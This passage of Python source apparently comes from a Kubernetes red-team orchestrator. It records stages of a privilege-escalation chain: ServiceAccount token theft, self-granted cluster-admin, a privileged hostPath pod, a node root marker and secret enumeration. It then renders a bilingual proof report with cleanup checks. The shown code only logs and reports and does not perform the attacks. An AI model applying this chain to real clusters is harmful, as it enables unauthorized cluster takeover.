            stage_results.append({"index": 7, "id": stage7["id"], "status": "failed",
                                  "started_at": time.time(), "finished_at": time.time(),
                                  "timeout_s": float(stage_timeout or stage7["timeout_s"]),
                                  "backups": [], "error": f"{type(exc).__name__}: {exc}",
                                  "forced": True})
            failed_stage = failed_stage or stage7["id"]

    cleanup = ctx.stage_evidence.get("stage-7-cleanup") or {}
    complete = (not cancelled and failed_stage is None
                and len(stage_results) == STAGE_COUNT
                and all(r["status"] == "success" for r in stage_results))
    cleanup_ok = bool(cleanup.get("verified"))
    ok = complete if complete else (failed_stage is None and not cancelled and cleanup_ok)
    proof = _build_proof(ctx, gates, stage_results, baseline, cleanup, failed_stage,
                         cancelled, complete, backend, out_dir)
    _write_proof(ctx, proof, out_dir)
    _persist_proof_step(ctx, proof)
    run.finalize_run()
    if ctx.token_kubeconfig:
        try:
            Path(ctx.token_kubeconfig).unlink(missing_ok=True)
        except OSError:
            pass
    run.log_action(session.name, "objective", CHAIN_ID,
                   {"marker": raw_marker, "namespace": ns},
                   "success" if ok else ("cancelled" if cancelled else "failed"))
    errors = [r for r in stage_results if r.get("error")]
    return {"ok": bool(ok), "complete": bool(complete), "cancelled": bool(cancelled),
            "failed_stage": failed_stage, "run": run.name,
            "error": errors[0]["error"] if errors else None,
            "proof": proof, "stages": stage_results, "gates": gates,
            "privesc_selection": privesc_selection,
            "backend": getattr(backend, "kind", "unknown")}


def _ask_confirmation(stage: dict[str, Any]) -> bool:
    print(_stage_prompt(stage), flush=True)
    try:
        answer = input("  确认执行该阶段? [y/N] ").strip().lower()
    except EOFError:
        return False
    return answer in ("y", "yes")


def _persist_stage(ctx: _Ctx, stage: dict[str, Any], result: dict[str, Any],
                   backups: list[dict[str, Any]]) -> None:
    artifact_dir = ctx.run.dir / "objective"
    artifact_dir.mkdir(parents=True, exist_ok=True)
    body = {"objective": CHAIN_ID, "stage": stage["id"], "index": stage["index"],
            "status": result["status"], "started_at": result.get("started_at"),
            "finished_at": result.get("finished_at"), "error": result.get("error"),
            "backups": backups, "evidence": result.get("evidence"),
            "fallback": stage["fallback"], "timeout_s": result.get("timeout_s"),
            "actions": [a for a in ctx.actions if a["stage"] == stage["id"]]}
    path = artifact_dir / f"{stage['id']}.json"
    path.write_text(json.dumps(body, ensure_ascii=False, indent=2), encoding="utf-8")
    digest = _sha256(path.read_bytes())
    result["artifact"] = str(path.relative_to(ctx.run.dir)).replace("\\", "/")
    result["artifact_sha256"] = digest
    step = ctx.run.add_step(
        stage["id"],
        prompt_or_cmd=json.dumps({"stage": stage["id"], "primitive": stage["primitive"],
                                  "writes": stage["writes"]}, ensure_ascii=False),
        env={"actor": ctx.session.name, "workspace": ctx.store.workspace,
             "objective": CHAIN_ID, "stage": stage["index"]},
        result_summary=f"{result['status']}: {stage['title']['zh']}",
        artifacts=[path])
    result["archive"] = step["archive"]
    if result["status"] == "success":
        sev, title, detail = _finding_for(stage["index"], result.get("evidence") or {})
        ctx.run.add_finding(stage["id"], sev, title, detail, evidence_path=step["archive"])
    else:
        ctx.run.add_finding(stage["id"], "high", f"目标链阶段失败：{stage['id']}",
                            str(result.get("error") or "")[:1000],
                            evidence_path=step["archive"])
    ctx.run.log_action(ctx.session.name, "objective-stage", stage["id"],
                       {"index": stage["index"], "status": result["status"]},
                       result["status"])


def _finding_for(index: int, evidence: dict[str, Any]) -> tuple[str, str, str]:
    if index == 1:
        return ("medium", "暴露的训练/推理服务与宽权限 operator SA 可枚举",
                f"入口 {evidence.get('entry', {}).get('url')}；服务数 "
                f"{evidence.get('services', {}).get('count')}；operator RBAC 可写。")
    if index == 2:
        return ("high", "ServiceAccount token 可获取且具备 RBAC 写权限",
                f"token {evidence.get('token', {}).get('sha256_prefix')}…；"
                f"身份 {evidence.get('whoami', {}).get('username')}。")
    if index == 3:
        return ("critical", "operator token 自建 cluster-admin 绑定 → 集群级接管",
                f"RoleBinding={evidence.get('rolebinding', {}).get('metadata', {}).get('name')}；"
                f"ClusterRoleBinding="
                f"{evidence.get('clusterrolebinding', {}).get('metadata', {}).get('name')}；"
                f"can-i all={evidence.get('can_i', {}).get('all')}。")
    if index == 4:
        return ("critical", "特权 Pod（privileged+hostPID+hostPath=/）创建成功",
                f"pod={evidence.get('pod', {}).get('name')}；"
                f"node={evidence.get('pod', {}).get('nodeName')}；"
                f"verified={evidence.get('verified')}。")
    if index == 5:
        marker = evidence.get("marker") or {}
        return ("critical", "节点 root marker 写入并回读一致",
                f"节点 {evidence.get('node_hostname')}；path={marker.get('path')}；"
                f"sha256={marker.get('sha256')}。")
    if index == 6:
        return ("critical", "集群级证明：列举 secrets / 创建测试 namespace / 回读 ConfigMap",
                f"secrets={evidence.get('secrets', {}).get('count')}；"
                f"namespace={evidence.get('test_namespace', {}).get('name')}；"
                f"configmap_read_back="
                f"{evidence.get('test_configmap', {}).get('read_back')}。")
    if index == 7:
        return ("info", "清理完成：测试对象删除、节点 marker 移除、无残留",
                f"verified={evidence.get('verified')}；"
                f"residue={evidence.get('residue')}。")
    return ("info", f"objective stage {index}", "")


def _build_proof(ctx: _Ctx, gates: dict[str, Any], stage_results: list[dict[str, Any]],
                 baseline: dict[str, Any], cleanup: dict[str, Any],
                 failed_stage: str | None, cancelled: bool, complete: bool,
                 backend: Any, out_dir: Path | str | None) -> dict[str, Any]:
    s3 = ctx.stage_evidence.get("stage-3-rbac-escalation") or {}
    s5 = ctx.stage_evidence.get("stage-5-node-marker") or {}
    s6 = ctx.stage_evidence.get("stage-6-cluster-proof") or {}
    proof: dict[str, Any] = {
        "schema": "inkblade.objective.proof/v1", "chain": CHAIN_ID,
        "generated_at": time.time(), "run": ctx.run.name, "marker": ctx.marker,
        "marker_name": ctx.marker_name,
        "backend": {"kind": getattr(backend, "kind", "unknown"),
                    "real_cluster": bool(getattr(backend, "real_cluster", False)),
                    "note": ("real Kubernetes API"
                             if getattr(backend, "real_cluster", False)
                             else "fake-kubectl fixture: NOT a real cluster")},
        "gates": gates, "complete": bool(complete), "failed_stage": failed_stage,
        "cancelled": bool(cancelled), "stages": stage_results,
        "highest_privilege": {
            "rbac": {"role": s3.get("role", "cluster-admin" if s3 else "not-achieved"),
                     "rolebinding": (s3.get("rolebinding") or {}).get(
                         "metadata", {}).get("name"),
                     "clusterrolebinding": (s3.get("clusterrolebinding") or {}).get(
                         "metadata", {}).get("name"),
                     "can_i": s3.get("can_i", {})},
            "node_root": {"node": s5.get("node_hostname"), "uid": s5.get("uid"),
                          "path": (s5.get("marker") or {}).get("path"),
                          "sha256": (s5.get("marker") or {}).get("sha256"),
                          "verified": bool((s5.get("marker") or {}).get("verified"))},
            "cluster_secrets": s6.get("secrets", {"count": 0, "names": [],
                                                   "namespaces": []}),
            "test_namespace": s6.get("test_namespace", {"created": False}),
            "test_configmap": s6.get("test_configmap", {"read_back": False}),
            "node_marker_readback": s6.get("node_marker_readback")},
        "cluster_actions": [a for a in ctx.actions if a["mutates"]],
        "read_actions": [a for a in ctx.actions if not a["mutates"]],
        "cleanup": cleanup or {"verified": False, "residue": ["cleanup did not run"],
                               "checks": [], "baseline": baseline},
        "baseline": baseline,
        "hardware_gates": ctx.chain["objective"].get("hardware_gates", []),
        "privesc": ctx.stage_evidence.get("__privesc_selection__") or {},
        "limits": ["单节点 QEMU/TCG k3s（非生产规模；无 HA/多节点调度验证）",
                   "硬件/交换机/带外阶段仅版本闸门 + 只读，不执行硬件写入",
                   "secret 仅列举名称，不读取 value；token 仅记录 sha256 前缀与尾 4 位"],
        "artifacts": {"proof": "objective-proof.json",
                      "cleanup_receipt": (cleanup or {}).get("receipt"),
                      "screenshot": None},
        "hashes": {"stage_artifacts": {r["id"]: r.get("artifact_sha256")
                                       for r in stage_results},
                   "actions_sha256": _sha256(_canonical(ctx.actions)),
                   "baseline_sha256": _sha256(_canonical(baseline)),
                   "manifest_sha256_at_proof": _manifest_sha(ctx.run)}}
    body = {k: v for k, v in proof.items() if k != "hashes"}
    body["hashes"] = {k: v for k, v in proof["hashes"].items() if k != "proof_sha256"}
    proof["hashes"]["proof_sha256"] = _sha256(_canonical(body))
    if out_dir:
        out = Path(out_dir)
        out.mkdir(parents=True, exist_ok=True)
        (out / "proof.json").write_text(json.dumps(proof, ensure_ascii=False, indent=2),
                                        encoding="utf-8")
    return proof


def _manifest_sha(run: Run) -> str:
    path = run.dir / "manifest.sha256"
    return _sha256(path.read_bytes()) if path.is_file() else ""


def _write_proof(ctx: _Ctx, proof: dict[str, Any], out_dir: Path | str | None) -> None:
    (ctx.run.dir / "objective-proof.json").write_text(
        json.dumps(proof, ensure_ascii=False, indent=2), encoding="utf-8")
    cleanup = proof.get("cleanup") or {}
    if cleanup:
        (ctx.run.dir / "objective-cleanup.json").write_text(
            json.dumps(cleanup, ensure_ascii=False, indent=2), encoding="utf-8")
    if out_dir:
        out = Path(out_dir)
        out.mkdir(parents=True, exist_ok=True)
        (out / "proof.json").write_text(json.dumps(proof, ensure_ascii=False, indent=2),
                                        encoding="utf-8")


def _persist_proof_step(ctx: _Ctx, proof: dict[str, Any]) -> None:
    path = ctx.run.dir / "objective-proof.json"
    step = ctx.run.add_step(
        "objective-proof",
        prompt_or_cmd=json.dumps({"chain": CHAIN_ID, "marker": ctx.marker_name,
                                  "backend": proof["backend"]["kind"]},
                                 ensure_ascii=False),
        env={"actor": ctx.session.name, "workspace": ctx.store.workspace,
             "objective": CHAIN_ID},
        result_summary=f"cleanup_verified={proof['cleanup'].get('verified')} "
                       f"complete={proof['complete']}",
        artifacts=[path, ctx.run.dir / "objective-cleanup.json",
                   ctx.run.dir / "manifest.sha256"])
    ctx.run.log_action(ctx.session.name, "objective-proof", CHAIN_ID,
                       {"proof_sha256": proof["hashes"]["proof_sha256"],
                        "archive": step["archive"]}, "written")


# ---------------------------------------------------------------- report

def _cell(value: Any) -> str:
    return str(value).replace("|", "\\|").replace("\n", " ").strip()


def render_report(proof: dict[str, Any], lang: str = "bi") -> str:
    if lang not in ("bi", "zh", "en"):
        raise ValueError("lang 必须为 bi/zh/en")
    hp = proof.get("highest_privilege") or {}
    cleanup = proof.get("cleanup") or {}
    backend = proof.get("backend") or {}
    rbac, node = hp.get("rbac") or {}, hp.get("node_root") or {}
    secrets = hp.get("cluster_secrets") or {}
    test_ns = hp.get("test_namespace") or {}
    test_cm = hp.get("test_configmap") or {}
    lines = [
        "# " + _pick(lang, "最高权限证明报告（中英双语）",
                     "Highest-Privilege Proof Report (Bilingual)"), "",
        f"- **PROOF marker**: `{proof.get('marker')}`",
        f"- **run**: `{proof.get('run')}`",
        f"- **backend**: `{backend.get('kind')}` (real_cluster={backend.get('real_cluster')})",
        f"- **generated_at**: `{time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(proof.get('generated_at', 0)))}`",
        f"- **proof_sha256**: `{proof.get('hashes', {}).get('proof_sha256', '')}`", "",
        "## " + _pick(lang, "最高权限证明", "Highest-Privilege Proof"), "",
        "| " + _pick(lang, "证明项", "Proof item") + " | " +
        _pick(lang, "结果", "Result") + " | " +
        _pick(lang, "证据", "Evidence") + " |", "|---|---|---|",
        f"| RBAC | `{rbac.get('role')}` | RoleBinding `{rbac.get('rolebinding')}`；"
        f"ClusterRoleBinding `{rbac.get('clusterrolebinding')}`；"
        f"can-i all={_cell(rbac.get('can_i'))} |",
        f"| " + _pick(lang, "节点 root", "Node root") +
        f" | verified={node.get('verified')} | node=`{node.get('node')}`；"
        f"uid=`{_cell(node.get('uid'))}`；path=`{node.get('path')}`；"
        f"sha256=`{node.get('sha256')}` |",
        f"| " + _pick(lang, "集群 secret 列举", "Cluster secret enumeration") +
        f" | count={secrets.get('count')} | namespaces={_cell(secrets.get('namespaces'))} |",
        f"| " + _pick(lang, "测试 namespace", "Test namespace") +
        f" | created={test_ns.get('created')} | `{test_ns.get('name')}` |",
        f"| " + _pick(lang, "测试 ConfigMap", "Test ConfigMap") +
        f" | read_back={test_cm.get('read_back')} | "
        f"`{test_cm.get('namespace')}/{test_cm.get('name')}` |", "",
        "## " + _pick(lang, "提权面", "Privesc surface"), "",
    ]
    privesc = proof.get("privesc") or {}
    if privesc:
        chosen = privesc.get("chosen") or {}
        lines += [
            f"- " + _pick(lang, "选路状态", "Selection status") +
            f": `{privesc.get('status')}`",
            f"- " + _pick(lang, "起始主体", "Principal") +
            f": `{privesc.get('principal', '')}`",
            f"- " + _pick(lang, "选中路径", "Chosen path") +
            f": `{' → '.join(chosen.get('vector_ids') or []) or _pick(lang, '已是管理员/无需提权', 'already admin')}`",
            f"- " + _pick(lang, "选择依据", "Rationale") +
            f": {_cell(privesc.get('rationale') or '')}",
            f"- " + _pick(lang, "备选路径", "Alternates") +
            f": {len(privesc.get('alternates') or [])} " +
            _pick(lang, "条", "path(s)"),
            "",
        ]
        if privesc.get("fallback"):
            lines += [f"- " + _pick(lang, "回退", "Fallback") +
                      f": `{privesc.get('fallback')}`", ""]
    else:
        lines += ["- " + _pick(lang, "未记录提权选路（backend 无状态快照）",
                               "No privesc selection recorded (backend has no state snapshot)"), ""]
    lines += [
        "### " + _pick(lang, "集群级动作清单", "Cluster-level action list"), "",
        "| # | stage | verb | resource | namespace | name | result | sha256 |",
        "|---|---|---|---|---|---|---|---|"]
    for i, action in enumerate(proof.get("cluster_actions") or [], start=1):
        lines.append(f"| {i} | {_cell(action.get('stage'))} | "
                     f"{_cell(action.get('verb'))} | {_cell(action.get('resource'))} | "
                     f"{_cell(action.get('namespace'))} | {_cell(action.get('name'))} | "
                     f"{_cell(action.get('result'))} | "
                     f"`{str(action.get('sha256') or '')[:16]}` |")
    if not proof.get("cluster_actions"):
        lines.append(f"| — | — | — | — | — | — | {_pick(lang, '无', 'none')} | — |")
    lines += ["", "### " + _pick(lang, "已清理声明 / Cleanup", "Cleanup / 已清理声明"),
              "", f"- **verified**: `{cleanup.get('verified')}`",
              f"- **residue**: `{cleanup.get('residue')}`",
              f"- **fixture_cleanup**: `{cleanup.get('fixture_cleanup')}`", "",
              "| " + _pick(lang, "检查项", "Check") + " | " +
              _pick(lang, "结果", "Result") + " | " +
              _pick(lang, "观测", "Observed") + " |", "|---|---|---|"]
    for check in cleanup.get("checks") or []:
        lines.append(f"| {_cell(check.get('check'))} | "
                     f"{'PASS' if check.get('ok') else 'FAIL'} | "
                     f"{_cell(check.get('observed'))} |")
    lines.append("")
    if cleanup.get("verified"):
        lines.append(_pick(
            lang,
            "**已清理**：测试 namespace、测试 ConfigMap、pwn RoleBinding/ClusterRoleBinding、"
            "特权 Pod 与节点 `/root` proof 文件均已删除，并在删除后按基线复核；本次运行未留下持久化对象。",
            "**Cleanup confirmed**: test namespace/ConfigMap, pwn RoleBinding/ClusterRoleBinding, "
            "privileged Pod and the node `/root` proof file were deleted and re-checked against "
            "the baseline; this run left no persistent objects."))
    else:
        lines.append(_pick(lang,
                           "**未确认清理**：存在残留，按失败处理；不得对外宣称已清理。",
                           "**Cleanup NOT confirmed**: residue exists; treat as failed and do "
                           "not claim cleanup."))
    lines += ["", "### " + _pick(lang, "阶段与证据哈希", "Stages and evidence hashes"),
              "", "| # | stage | status | artifact | sha256 |",
              "|---|---|---|---|---|"]
    for stage in proof.get("stages") or []:
        lines.append(f"| {stage.get('index')} | {_cell(stage.get('id'))} | "
                     f"{_cell(stage.get('status'))} | {_cell(stage.get('artifact'))} | "
                     f"`{str(stage.get('artifact_sha256') or '')[:16]}` |")
    shot = (proof.get("artifacts") or {}).get("screenshot")
    lines += ["", "### " + _pick(lang, "截图与哈希", "Screenshot and hashes"), ""]
    if shot:
        lines.append(f"- screenshot: `{shot.get('path')}` sha256=`{shot.get('sha256')}`")
    else:
        lines.append(_pick(lang, "- screenshot: 未附加（终端转录与 proof.json 哈希为准）",
                           "- screenshot: not attached (terminal transcript + "
                           "proof.json hashes)"))
    lines += [f"- stage artifacts: `{_cell(proof.get('hashes', {}).get('stage_artifacts'))}`",
              f"- actions_sha256: `{proof.get('hashes', {}).get('actions_sha256')}`",
              f"- proof_sha256: `{proof.get('hashes', {}).get('proof_sha256')}`", "",
              "### " + _pick(lang, "边界与硬件闸门", "Boundaries and hardware gates"), ""]
    for item in proof.get("limits") or []:
        lines.append(f"- {item}")
    for gate in proof.get("hardware_gates") or []:
        lines.append(f"- `{gate.get('id')}`: {gate.get('status')} / "
                     f"max_action={gate.get('max_action')} — {gate.get('reason')}")
    lines += ["", "---", _pick(
        lang, "*本报告由 InkBlade objective 编排器生成；证据锚为 proof.json 与三层证据库。*",
        "*Generated by the InkBlade objective orchestrator; evidence anchors are "
        "proof.json and the three-layer evidence store.*")]
    return "\n".join(lines) + "\n"


def write_report(proof: dict[str, Any], path: Path | str, lang: str = "bi") -> Path:
    out = Path(path)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(render_report(proof, lang=lang), encoding="utf-8")
    return out
